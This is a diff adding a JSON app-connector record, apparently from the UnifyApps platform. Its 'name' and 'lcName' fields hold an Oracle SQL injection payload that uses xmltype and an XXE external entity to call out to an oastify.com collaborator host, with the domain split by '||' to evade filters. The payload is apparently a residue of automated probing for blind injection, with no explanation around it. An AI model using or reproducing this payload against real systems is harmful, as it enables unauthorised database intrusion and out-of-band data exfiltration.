@@ -1,0 +1,15 @@
+{
+	"createdTime":1741342059585,
+	"deleted":false,
+	"enabled":false,
+	"id":"67cac56b19d8a25fc18fa6aa",
+	"lastModifiedBy":22743,
+	"lcName":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"utf-8\"?><!doctype root [ <!entity % iiqqp system \"http://k2nr5y7r3uikv2slej7lp6b2dtjm7nyb1ztmja8.oasti'||'fy.com/\">%iiqqp;]>'),'/l') from dual)",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741342059585,
+	"name":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % iiqqp SYSTEM \"http://k2nr5y7r3uikv2slej7lp6b2dtjm7nyb1ztmja8.oasti'||'fy.com/\">%iiqqp;]>'),'/l') from dual)",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
